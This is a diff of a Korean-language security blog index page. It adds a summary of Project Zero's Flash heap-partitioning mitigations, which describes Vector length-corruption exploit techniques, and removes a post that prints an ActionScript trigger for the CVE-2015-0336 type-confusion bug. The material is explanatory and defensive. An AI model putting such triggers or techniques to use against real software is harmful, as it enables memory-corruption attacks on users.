@@ -9,7 +9,7 @@
   <meta name="author" content="KC">
 
   
-  <meta name="description" content="HTTP Strict Transport Security HSTS 를 안쓰면, HTTP -> 301 Moved Permanently -> HTTPS 로 바꿔야한다. HSTS 를 쓰면, HTTP -> 307 Internal Redirect -> HTTPS 로 간다. &hellip;">
+  <meta name="description" content="Project Zero 의 Flash mitigation 에 관한 글을 요약 정리해본다. 이번에 버전업된 18.0.0.209 의 경우. Significant Flash exploit mitigations are live v18.0.0.209 최근의 Flash &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -65,6 +65,71 @@
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/07/17/significant-flash-exploit-mitigations-are-live-in-v18-dot-0-0-dot-209/">Significant Flash Exploit Mitigations Are Live in v18.0.0.209</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-07-17T15:38:05+09:00'><span class='date'><span class='date-month'>Jul</span> <span class='date-day'>17</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>3:38 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Project Zero 의 Flash mitigation 에 관한 글을 요약 정리해본다.</p>
+
+<p>이번에 버전업된 18.0.0.209 의 경우.</p>
+
+<p><a href="http://googleprojectzero.blogspot.kr/2015/07/significant-flash-exploit-mitigations_16.html">Significant Flash exploit mitigations are live v18.0.0.209</a></p>
+
+<h4>최근의 Flash exploit 경향</h4>
+
+<p>heap 에서 앞쪽의 버퍼를 overflow 시켜서, 뒤쪽에 위치한 <code>Vector.&lt;uint&gt;</code> 를 overwrite 한다. <code>Vector.&lt;uint&gt;</code> 의 앞 4 바이트는 <code>length</code> 이다. 이 <code>length</code> 를 무지하게 큰 수로 만들어서 메모리 대부분을 read/write 할 수 있는 list 를 만든다.</p>
+
+<p>또는 use-after-free 를 이용해서 <code>Vector.&lt;uint&gt;</code> 의 <code>length</code> 를 overwrite 한다. ByteArray 로 heap chunk 를 pointing 하게 셋업하고, free 시키고 <code>Vector.&lt;uint&gt;</code> 를 그 자리에 alloc 하고, 앞서 만든 ByteArray pointer 를 사용해 memory write 를 만들어낸다. 원래 heap chunk 는 free 되버리고, 이상한 녀석이 그 자리에 들어와있는데, memory write 가 일어나니, <code>Vector.&lt;uint&gt;</code> 의 <code>length</code> 에 write 가 일어나버리고, 역시 마찬가지로 <code>length</code> 가 무지하게 커져버린 전천후 list 가 만들어진다.</p>
+
+<p>최근 공개된 Hacking Team 의 Flash 0day 들도 비슷한 use-after-free 방식.</p>
+
+<h4>Mitigation: <code>Vector.&lt;uint&gt;</code> buffer heap partitioning</h4>
+
+<p>Adobe Flash 18.0.0.209 에서는 Heap partitioning 을 도입했다. <code>Vector.&lt;uint&gt;</code> 가 alloc 되는 heap 을 별도로 마련한것.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>_bigVec = new Vector.&lt;uint&gt;;
+</span><span class='line'>_bigVec.length = ((512 * 1024 * 1024) - 500) / 4;
+</span><span class='line'>_bigVec[0] = 0xf2f2f2f2;
+</span><span class='line'>_bigArr = new ByteArray();
+</span><span class='line'>_bigArr.length = 512 * 1024 * 1024;
+</span><span class='line'>_bigArr[0] = 0xf1;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>을 해서, 프로세스 메모리 맵을 보면 <code>_bigVec</code> 과 <code>_bigArr</code> 는 꽤 떨어진 영역에 위치하게 된다.</p>
+
+<h4>Mitigations: stronger randomization for the Flash heap</h4>
+
+<h4>Mitigations: <code>Vector.&lt;*&gt;</code> length validation</h4>
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -1296,73 +1361,6 @@ _ba[3] 은 여전히 0 이여야하고, 0x40 은 vector 에 씌여진다.</p>
 
     </article>
   
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2015/06/20/understanding-type-confusion-vulnerabilities-cve-2015-0336/">Understanding Type Confusion Vulnerabilities: CVE-2015-0336</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2015-06-20T14:08:38+09:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>20</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>2:08 pm</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>TechNet blogs 에 올라온 글을 정리해본다.</p>
-
-<p><a href="http://blogs.technet.com/b/mmpc/archive/2015/06/18/understanding-type-confusion-vulnerabilities-cve-2015-0336.aspx">Understanding type confusion vulnerabilities: CVE-2015-0336</a></p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>class Trigger
-</span><span class='line'>{
-</span><span class='line'>    function Trigger()
-</span><span class='line'>    {
-</span><span class='line'>        var _loc2_ = _global.ASnative(2100,438181888);
-</span><span class='line'>        var _loc3_ = new Object();
-</span><span class='line'>        _loc2_.__proto__ = _loc3_;
-</span><span class='line'>        _global.ASnative(2100,200)(_loc3_);
-</span><span class='line'>        _global.ASnative(2100,8).apply(_loc2_,[1]);
-</span><span class='line'>        var _loc4_ = new LocalConnection();
-</span><span class='line'>        _loc4_.send("toAS3","trig_loaded");
-</span><span class='line'>    }
-</span><span class='line'>    static function main(mc)
-</span><span class='line'>    {
-</span><span class='line'>        Trigger.app = new Trigger();
-</span><span class='line'>    }
-</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
-
-</div>
-  
-  
-
-
-    </article>
-  
   <div class="pagination">
     
       <a class="prev" href="/posts/5">&larr; Older</a>
@@ -1380,6 +1378,10 @@ _ba[3] 은 여전히 0 이여야하고, 0x40 은 vector 에 씌여진다.</p>
   <ul id="recent_posts">
     
       <li class="post">
+        <a href="/blog/2016/02/11/how2heap/">How2heap</a>
+      </li>
+    
+      <li class="post">
         <a href="/blog/2016/02/11/racing-midi-messages-in-chrome/">Racing MIDI Messages in Chrome</a>
       </li>
     
@@ -1393,10 +1395,6 @@ _ba[3] 은 여전히 0 이여야하고, 0x40 은 vector 에 씌여진다.</p>
     
       <li class="post">
         <a href="/blog/2016/02/03/qseecom/">Qseecom</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2016/01/15/tf-idf/">TF-IDF</a>
       </li>
     
   </ul>
